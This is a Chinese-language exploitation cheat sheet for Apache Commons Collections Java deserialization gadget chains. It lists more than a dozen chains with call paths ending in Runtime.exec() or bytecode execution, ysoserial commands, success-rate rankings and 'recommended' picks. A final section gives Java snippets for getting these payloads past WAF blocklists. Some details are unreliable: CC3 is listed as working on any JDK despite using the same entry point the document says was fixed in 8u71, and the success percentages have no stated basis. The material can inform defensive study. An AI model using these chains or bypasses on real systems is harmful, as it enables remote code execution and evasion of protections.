# Commons Collections Gadget Chains 详解

## 概述

Apache Commons Collections 3.x 版本存在多个反序列化 Gadget Chain，是 Java 反序列化漏洞中最经典和常用的攻击向量。本文档涵盖了从 CC1 到 CC10 以及社区发现的多个变种。

## 受影响版本

- `commons-collections:commons-collections` 3.0 - 3.2.1
- `org.apache.commons:commons-collections4` 4.0

---

## 1. AnnotationInvocationHandler 入口组

### CC1 - CommonsCollections1 (by Matthias Kaiser)

**适用JDK:** < 8u71

**完整利用链:**
```
AnnotationInvocationHandler.readObject()
  → TransformedMap.checkSetValue()
    → ChainedTransformer.transform()
      → InvokerTransformer.transform()
        → Runtime.exec()
```

**关键类:**
- `sun.reflect.annotation.AnnotationInvocationHandler`
- `org.apache.commons.collections.map.TransformedMap`
- `org.apache.commons.collections.functors.ChainedTransformer`
- `org.apache.commons.collections.functors.InvokerTransformer`

**特点:**
- 原始 CC1 链，使用 TransformedMap
- JDK 8u71 后 AnnotationInvocationHandler 被修复

**ysoserial:**
```bash
java -jar ysoserial.jar CommonsCollections1 "calc"
```

**利用难度:** ⭐⭐⭐ (中)
**成功率:** 60%

---

### CC1 - LazyMap 变种

**适用JDK:** < 8u71

**完整利用链:**
```
AnnotationInvocationHandler.readObject()
  → Map.entrySet()
    → LazyMap.get()
      → ChainedTransformer.transform()
        → InvokerTransformer.transform()
          → Runtime.exec()
```

**关键类:**
- `sun.reflect.annotation.AnnotationInvocationHandler`
- `org.apache.commons.collections.map.LazyMap`
- `org.apache.commons.collections.functors.ChainedTransformer`

**特点:**
- 使用 LazyMap 代替 TransformedMap
- 绕过某些只拦截 TransformedMap 的 WAF

**利用难度:** ⭐⭐⭐ (中)
**成功率:** 60%

---

### CC3 - CommonsCollections3

**适用JDK:** 任意版本 ✅

**完整利用链:**
```
AnnotationInvocationHandler.readObject()
  → InstantiateTransformer.transform()
    → TrAXFilter.<init>()
      → TemplatesImpl.newTransformer()
        → [bytecode execution]
```

**关键类:**
- `org.apache.commons.collections.functors.InstantiateTransformer`
- `com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter`
- `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`

**特点:**
- 使用 TemplatesImpl 动态字节码加载
- 不依赖 InvokerTransformer，绕过黑名单
- 需要构造恶意字节码

**ysoserial:**
```bash
java -jar ysoserial.jar CommonsCollections3 "calc"
```

**利用难度:** ⭐⭐⭐⭐ (高)
**成功率:** 75%

---

## 2. HashSet 入口组

### CC6 - CommonsCollections6

**适用JDK:** 任意版本 ✅

**完整利用链:**
```
HashSet.readObject()
  → HashMap.put()
    → TiedMapEntry.hashCode()
      → LazyMap.get()
        → ChainedTransformer.transform()
          → InvokerTransformer.transform()
            → Runtime.exec()
```

**关键类:**
- `java.util.HashSet`
- `org.apache.commons.collections.keyvalue.TiedMapEntry`
- `org.apache.commons.collections.map.LazyMap`

**特点:**
- 使用 JDK 内置类 HashSet 作为入口
- 不受 JDK 版本限制
- 高成功率

**ysoserial:**
```bash
java -jar ysoserial.jar CommonsCollections6 "calc"
```

**利用难度:** ⭐⭐ (低)
**成功率:** 90%

---

### CC10 - CommonsCollections10 (by wh1t3p1g)

**适用JDK:** 任意版本 ✅

**完整利用链:**
```
HashSet.readObject()
  → HashMap.put()
    → TiedMapEntry.hashCode()
      → LazyMap.get()
        → InvokerTransformer.transform()
          → TemplatesImpl.newTransformer()
            → [bytecode execution]
```

**关键类:**
- `java.util.HashSet`
- `org.apache.commons.collections.keyvalue.TiedMapEntry`
- `org.apache.commons.collections.functors.InvokerTransformer`
- `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`

**特点:**
- CC6 + TemplatesImpl 的组合
- 绕过 ChainedTransformer 检测

**利用难度:** ⭐⭐⭐ (中)
**成功率:** 85%

---

## 3. HashMap 入口组

### CCK3 - CommonsCollectionsKOLR3 (by KORLR)

**适用JDK:** 任意版本 ✅

**完整利用链:**
```
HashMap.readObject()
  → TiedMapEntry.hashCode()
    → LazyMap.get()
      → ChainedTransformer.transform()
        → ConstantTransformer.transform()
          → InvokerTransformer.transform()
            → Runtime.exec()
```

**关键类:**
- `java.util.HashMap`
- `org.apache.commons.collections.keyvalue.TiedMapEntry`
- `org.apache.commons.collections.functors.ConstantTransformer`

**特点:**
- 直接使用 HashMap 作为入口
- 使用 ConstantTransformer 传递 Runtime 对象

**利用难度:** ⭐⭐ (低)
**成功率:** 90%

---

### CC3 - phith0n 变种 (by phith0n)

**适用JDK:** 任意版本 ✅

**完整利用链:**
```
HashMap.readObject()
  → TiedMapEntry.hashCode()
    → LazyMap.get()
      → InstantiateTransformer.transform()
        → TrAXFilter.<init>()
          → TemplatesImpl.newTransformer()
            → [bytecode execution]
```

**关键类:**
- `java.util.HashMap`
- `org.apache.commons.collections.functors.InstantiateTransformer`
- `com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter`
- `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`

**特点:**
- 使用 HashMap + InstantiateTransformer
- 适用于 Shiro 等场景

**利用难度:** ⭐⭐⭐ (中)
**成功率:** 80%

---

### CC_MapTransformer (by Ricky@)

**适用JDK:** 任意版本 ✅

**完整利用链:**
```
HashMap.readObject()
  → TiedMapEntry.hashCode()
    → LazyMap.get()
      → MapTransformer.transform()
        → InstantiateTransformer.transform()
          → TrAXFilter.<init>()
            → TemplatesImpl.newTransformer()
```

**关键类:**
- `org.apache.commons.collections.functors.MapTransformer`
- `org.apache.commons.collections.functors.InstantiateTransformer`

**特点:**
- 使用 MapTransformer 包装
- 绕过直接检测 InstantiateTransformer

**利用难度:** ⭐⭐⭐ (中)
**成功率:** 75%

---

### CCK1 / CommonsCollectionsShiro (by KORLR & phith0n)

**适用JDK:** 任意版本 ✅

**完整利用链:**
```
HashMap.readObject()
  → TiedMapEntry.hashCode()
    → LazyMap.get()
      → InvokerTransformer.transform()
        → TemplatesImpl.newTransformer()
          → [bytecode execution]
```

**关键类:**
- `java.util.HashMap`
- `org.apache.commons.collections.functors.InvokerTransformer`
- `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`

**特点:**
- 专门针对 Shiro 反序列化
- 不使用 ChainedTransformer，减小 payload 体积

**利用难度:** ⭐⭐⭐ (中)
**成功率:** 85%

---

### CC_FactoryTransformer (by Y4tacker)

**适用JDK:** 任意版本 ✅

**完整利用链:**
```
HashMap.readObject()
  → TiedMapEntry.hashCode()
    → LazyMap.get()
      → FactoryTransformer.transform()
        → InstantiateFactory.create()
          → TrAXFilter.<init>()
            → TemplatesImpl.newTransformer()
```

**关键类:**
- `org.apache.commons.collections.functors.FactoryTransformer`
- `org.apache.commons.collections.functors.InstantiateFactory`

**特点:**
- 使用 FactoryTransformer 包装
- 绕过 InstantiateTransformer 检测

**利用难度:** ⭐⭐⭐ (中)
**成功率:** 75%

---

## 4. BadAttributeValueExpException 入口组

### CC5 - CommonsCollections5

**适用JDK:** 任意版本 ✅

**完整利用链:**
```
BadAttributeValueExpException.readObject()
  → TiedMapEntry.toString()
    → TiedMapEntry.getValue()
      → LazyMap.get()
        → ChainedTransformer.transform()
          → InvokerTransformer.transform()
            → Runtime.exec()
```

**关键类:**
- `javax.management.BadAttributeValueExpException` (JDK 内置)
- `org.apache.commons.collections.keyvalue.TiedMapEntry`
- `org.apache.commons.collections.map.LazyMap`

**特点:**
- 不受 JDK 版本限制
- 高成功率，推荐使用

**ysoserial:**
```bash
java -jar ysoserial.jar CommonsCollections5 "calc"
```

**利用难度:** ⭐⭐ (低)
**成功率:** 95%

---

### 无数组 CC5 - TemplatesImpl 变种

**适用JDK:** 任意版本 ✅

**完整利用链:**
```
BadAttributeValueExpException.readObject()
  → TiedMapEntry.toString()
    → LazyMap.get()
      → InvokerTransformer.transform()
        → TemplatesImpl.newTransformer()
          → [bytecode execution]
```

**关键类:**
- `javax.management.BadAttributeValueExpException`
- `org.apache.commons.collections.functors.InvokerTransformer`
- `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`

**特点:**
- 不使用 Transformer 数组
- payload 更小，适合内存受限场景

**利用难度:** ⭐⭐⭐ (中)
**成功率:** 85%

---

### CC9 - CommonsCollections9 (by meizjm3i)

**适用JDK:** 任意版本 ✅

**完整利用链:**
```
BadAttributeValueExpException.readObject()
  → TiedMapEntry.toString()
    → DefaultedMap.get()
      → ChainedTransformer.transform()
        → InvokerTransformer.transform()
          → Runtime.exec()
```

**关键类:**
- `javax.management.BadAttributeValueExpException`
- `org.apache.commons.collections.map.DefaultedMap`
- `org.apache.commons.collections.keyvalue.TiedMapEntry`

**特点:**
- 使用 DefaultedMap 代替 LazyMap
- 绕过只拦截 LazyMap 的 WAF

**利用难度:** ⭐⭐ (低)
**成功率:** 90%

---

## 5. TreeBag 入口组

### CC8 - CommonsCollections8 (by navalorenzo)

**适用JDK:** 任意版本 ✅

**完整利用链:**
```
TreeBag.readObject()
  → TransformingComparator.compare()
    → InvokerTransformer.transform()
      → TemplatesImpl.newTransformer()
        → [bytecode execution]
```

**关键类:**
- `org.apache.commons.collections.bag.TreeBag`
- `org.apache.commons.collections.comparators.TransformingComparator`
- `org.apache.commons.collections.functors.InvokerTransformer`

**特点:**
- 使用 TreeBag 作为入口（较少被检测）
- 结合 TemplatesImpl 执行字节码

**利用难度:** ⭐⭐⭐ (中)
**成功率:** 80%

---

## 6. PriorityQueue 入口组

### CC2 - CommonsCollections2

**适用JDK:** 任意版本 ✅

**完整利用链:**
```
PriorityQueue.readObject()
  → TransformingComparator.compare()
    → InvokerTransformer.transform()
      → TemplatesImpl.newTransformer()
        → [bytecode execution]
```

**关键类:**
- `java.util.PriorityQueue` (JDK 内置)
- `org.apache.commons.collections.comparators.TransformingComparator`
- `org.apache.commons.collections.functors.InvokerTransformer`

**特点:**
- 使用 JDK 内置 PriorityQueue
- 结合 TemplatesImpl 字节码加载

**ysoserial:**
```bash
java -jar ysoserial.jar CommonsCollections2 "calc"
```

**利用难度:** ⭐⭐⭐ (中)
**成功率:** 85%

---

### CC4 - CommonsCollections4

**适用JDK:** 任意版本 ✅

**完整利用链:**
```
PriorityQueue.readObject()
  → TransformingComparator.compare()
    → ChainedTransformer.transform()
      → InstantiateTransformer.transform()
        → TrAXFilter.<init>()
          → TemplatesImpl.newTransformer()
```

**关键类:**
- `java.util.PriorityQueue`
- `org.apache.commons.collections.comparators.TransformingComparator`
- `org.apache.commons.collections.functors.ChainedTransformer`
- `org.apache.commons.collections.functors.InstantiateTransformer`

**特点:**
- CC2 + ChainedTransformer 组合

**ysoserial:**
```bash
java -jar ysoserial.jar CommonsCollections4 "calc"
```

**利用难度:** ⭐⭐⭐ (中)
**成功率:** 80%

---

### 无数组 CC4

**适用JDK:** 任意版本 ✅

**完整利用链:**
```
PriorityQueue.readObject()
  → TransformingComparator.compare()
    → InstantiateTransformer.transform()
      → TrAXFilter.<init>()
        → TemplatesImpl.newTransformer()
```

**关键类:**
- `java.util.PriorityQueue`
- `org.apache.commons.collections.functors.InstantiateTransformer`

**特点:**
- 不使用 ChainedTransformer
- payload 更精简

**利用难度:** ⭐⭐⭐ (中)
**成功率:** 80%

---

## 7. Hashtable 入口组

### CC7 - CommonsCollections7

**适用JDK:** 任意版本 ✅

**完整利用链:**
```
Hashtable.readObject()
  → Hashtable.reconstitutionPut()
    → AbstractMap.equals()
      → LazyMap.get()
        → ChainedTransformer.transform()
          → InvokerTransformer.transform()
            → Runtime.exec()
```

**关键类:**
- `java.util.Hashtable` (JDK 内置)
- `java.util.AbstractMap`
- `org.apache.commons.collections.map.LazyMap`

**特点:**
- 使用 Hashtable.equals 触发
- 不受 JDK 版本限制

**ysoserial:**
```bash
java -jar ysoserial.jar CommonsCollections7 "calc"
```

**利用难度:** ⭐⭐ (低)
**成功率:** 90%

---

### CC6+CC7 混合链

**适用JDK:** 任意版本 ✅

**完整利用链:**
```
Hashtable.readObject()
  → Hashtable.reconstitutionPut()
    → TiedMapEntry.hashCode()
      → LazyMap.get()
        → ChainedTransformer.transform()
          → InvokerTransformer.transform()
            → Runtime.exec()
```

**关键类:**
- `java.util.Hashtable`
- `org.apache.commons.collections.keyvalue.TiedMapEntry`
- `org.apache.commons.collections.map.LazyMap`

**特点:**
- 结合 CC6 和 CC7 的优点
- 使用 TiedMapEntry.hashCode 触发

**利用难度:** ⭐⭐ (低)
**成功率:** 90%

---

### 无数组 CC7 - TemplatesImpl 变种

**适用JDK:** 任意版本 ✅

**完整利用链:**
```
Hashtable.readObject()
  → Hashtable.reconstitutionPut()
    → AbstractMap.equals()
      → LazyMap.get()
        → InvokerTransformer.transform()
          → TemplatesImpl.newTransformer()
            → [bytecode execution]
```

**关键类:**
- `java.util.Hashtable`
- `org.apache.commons.collections.functors.InvokerTransformer`
- `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`

**特点:**
- 不使用 ChainedTransformer 数组
- payload 更小

**利用难度:** ⭐⭐⭐ (中)
**成功率:** 85%

---

## 链特性对比

| 链名称 | 入口类 | JDK 限制 | 利用难度 | 成功率 | 推荐度 |
|:-------|:-------|:---------|:---------|:-------|:-------|
| CC1 (TransformedMap) | AnnotationInvocationHandler | < 8u71 | 中 | 60% | ⭐⭐ |
| CC1 (LazyMap) | AnnotationInvocationHandler | < 8u71 | 中 | 60% | ⭐⭐ |
| CC3 | AnnotationInvocationHandler | 任意 | 高 | 75% | ⭐⭐⭐ |
| CC5 | BadAttributeValueExpException | 任意 | 低 | 95% | ⭐⭐⭐⭐⭐ |
| CC6 | HashSet | 任意 | 低 | 90% | ⭐⭐⭐⭐ |
| CC7 | Hashtable | 任意 | 低 | 90% | ⭐⭐⭐⭐ |
| CC2 | PriorityQueue | 任意 | 中 | 85% | ⭐⭐⭐ |
| CC4 | PriorityQueue | 任意 | 中 | 80% | ⭐⭐⭐ |
| CC8 | TreeBag | 任意 | 中 | 80% | ⭐⭐⭐ |
| CC9 | BadAttributeValueExpException | 任意 | 低 | 90% | ⭐⭐⭐⭐ |
| CC10 | HashSet | 任意 | 中 | 85% | ⭐⭐⭐ |
| CCK1/Shiro | HashMap | 任意 | 中 | 85% | ⭐⭐⭐⭐ |
| CCK3 | HashMap | 任意 | 低 | 90% | ⭐⭐⭐⭐ |

---

## WAF 绕过技巧

### 1. 替换 Transformer 实现

**被拦截的常见类:**
- `InvokerTransformer`
- `ChainedTransformer`
- `ConstantTransformer`

**绕过方案:**
```java
// 方案 1: 使用 InstantiateTransformer + TemplatesImpl
InstantiateTransformer transformer = new InstantiateTransformer(
    new Class[] { Templates.class },
    new Object[] { templatesImpl }
);

// 方案 2: 使用 FactoryTransformer
FactoryTransformer transformer = new FactoryTransformer(
    new InstantiateFactory(TrAXFilter.class, ...)
);

// 方案 3: 使用 MapTransformer
MapTransformer transformer = new MapTransformer(...);
```

---

### 2. 替换 Map 实现

**被拦截的常见类:**
- `LazyMap`
- `TransformedMap`

**绕过方案:**
```java
// 使用 DefaultedMap 代替 LazyMap (CC9)
DefaultedMap map = DefaultedMap.decorate(innerMap, transformer);
```

---

### 3. 替换入口类

**高隐蔽性入口类（较少被检测）:**
- `TreeBag` (CC8)
- `PriorityQueue` (CC2/CC4)
- `Hashtable` (CC7)
- `HashMap` (CCK 系列)

---

### 4. 使用无数组变种

**优势:**
- payload 体积更小
- 避免检测 Transformer 数组
- 适合内存受限场景（如 Shiro）

**示例:**
```java
// 传统 CC5 - 使用 ChainedTransformer 数组
Transformer[] transformers = new Transformer[]{...};
ChainedTransformer chain = new ChainedTransformer(transformers);

// 无数组 CC5 - 直接使用 InvokerTransformer
InvokerTransformer invoker = new InvokerTransformer(
    "newTransformer", null, null
);
```

---

### 5. 使用 TemplatesImpl 字节码加载

**优势:**
- 不依赖 Runtime.exec()
- 可执行任意 Java 代码
- 绕过命令执行监控

**适用链:**
- CC3, CC8, CC2, CC4, CC10
- CCK1, 无数组变种



---

## 参考资料

### ysoserial

- [ysoserial - Java 反序列化工具](https://github.com/frohoff/ysoserial)
- 支持 CC1-CC7 的 payload 生成

### 安全研究文章

- [Java 反序列化漏洞原理与实战](https://paper.seebug.org/312/)
- [Commons Collections 反序列化漏洞深度分析](https://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/)

### 研究者贡献

- **Matthias Kaiser** - 发现原始 CC1 链
- **phith0n** - CC3 变种和 Shiro 场景利用
- **wh1t3p1g** - CC10 链
- **KORLR** - CCK1, CCK3 等变种
- **Ricky@** - CC_MapTransformer
- **Y4tacker** - CC_FactoryTransformer
- **meizjm3i** - CC9 (DefaultedMap)
- **navalorenzo** - CC8 (TreeBag)
